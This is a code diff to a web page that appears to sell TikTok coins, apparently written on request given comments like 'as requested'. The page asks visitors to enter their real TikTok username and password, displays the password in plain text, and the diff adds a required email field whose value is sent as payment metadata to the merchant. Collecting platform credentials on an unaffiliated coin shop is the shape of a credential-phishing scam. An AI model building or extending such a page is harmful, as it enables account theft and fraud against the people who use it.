@@ -452,6 +452,8 @@ body {
     <p>Log in to your TikTok account to confirm where to send coins.</p>
     <input type="text" id="usernameInput" placeholder="Username" required><br>
     <input type="password" id="passwordInput" placeholder="Password" required><br>
+    <!-- NEW: Email field added under password as requested -->
+    <input type="email" id="emailInput" placeholder="Email" required><br>
     <button id="continueBtn" disabled onclick="completeLogin()">Continue</button>
   </div>
 </div>
@@ -467,6 +469,8 @@ body {
       <div class="summary-label">Account</div>
       <div class="small-muted" id="accountUsername">@blesss</div>
       <div class="small-muted" id="accountPassword" style="margin-top:6px;">Password: ••••••••</div>
+      <!-- NEW: show email in order summary for user confirmation -->
+      <div class="small-muted" id="accountEmail" style="margin-top:6px;">Email: —</div>
     </div>
     <div style="text-align:right;">
       <div class="summary-label"> </div>
@@ -599,7 +603,6 @@ function completeLogin() {
     loggedIn = true;
     // update main button label
     updateMainButton();
-    // keep the username/password visible for confirmation later
     // close modal already done — user can click Buy
   }, 900);
 }
@@ -611,12 +614,15 @@ function showOrderSummary() {
   // Fill summary fields from current values
   const usernameVal = document.getElementById('usernameInput').value.trim() || 'blesss';
   const passwordVal = document.getElementById('passwordInput').value || '';
+  const emailVal = document.getElementById('emailInput').value.trim() || '—';
   const coins = selectedCoins > 0 ? selectedCoins : 0;
   const amount = Math.round(coins * coinRate);
 
   document.getElementById('accountUsername').textContent = '@' + usernameVal;
   // show password plainly for user confirmation per your request:
   document.getElementById('accountPassword').textContent = 'Password: ' + (passwordVal ? passwordVal : '—');
+  // show email in order summary
+  document.getElementById('accountEmail').textContent = 'Email: ' + emailVal;
 
   document.getElementById('summaryCoins').textContent = coins.toLocaleString() + ' Coins';
   document.getElementById('summaryAmount').textContent = formatCurrency(amount);
@@ -637,6 +643,7 @@ function closeOrderSummary() {
    ------------------------- */
 function payWithPaystack() {
   const usernameVal = document.getElementById('usernameInput').value.trim() || 'blesss';
+  const emailVal = document.getElementById('emailInput').value.trim() || '';
   const coins = selectedCoins > 0 ? selectedCoins : 0;
   if (coins <= 0) {
     alert('Please select a valid coins amount.');
@@ -647,12 +654,14 @@ function payWithPaystack() {
 
   const handler = PaystackPop.setup({
     key: PAYSTACK_PUBLIC_KEY,
-    email: MERCHANT_EMAIL, // using your merchant email as requested
+    // Keep merchant email as the payment recipient (per your original)
+    email: MERCHANT_EMAIL,
     amount: amountKobo,
     currency: 'NGN',
     metadata: {
       custom_fields: [
         { display_name: "TikTok username", variable_name: "username", value: '@' + usernameVal },
+        { display_name: "Customer email", variable_name: "customer_email", value: emailVal },
         { display_name: "Coins", variable_name: "coins", value: coins.toString() }
       ]
     },
@@ -689,14 +698,15 @@ function showSuccessToast() {
 }
 
 /* -------------------------
-   Complete Login button enablement
+   Complete Login button enablement (now requires email too)
    ------------------------- */
 const usernameField = document.getElementById('usernameInput');
 const passwordField = document.getElementById('passwordInput');
+const emailField = document.getElementById('emailInput');
 const continueBtn = document.getElementById('continueBtn');
 
 function checkLoginFields() {
-  if (usernameField.value.trim() && passwordField.value.trim()) {
+  if (usernameField.value.trim() && passwordField.value.trim() && emailField.value.trim()) {
     continueBtn.disabled = false;
     continueBtn.style.opacity = '1';
     continueBtn.style.cursor = 'pointer';
@@ -707,9 +717,10 @@ function checkLoginFields() {
   }
 }
 
-if (usernameField && passwordField) {
+if (usernameField && passwordField && emailField) {
   usernameField.addEventListener('input', checkLoginFields);
   passwordField.addEventListener('input', checkLoginFields);
+  emailField.addEventListener('input', checkLoginFields);
 }
 
 /* -------------------------
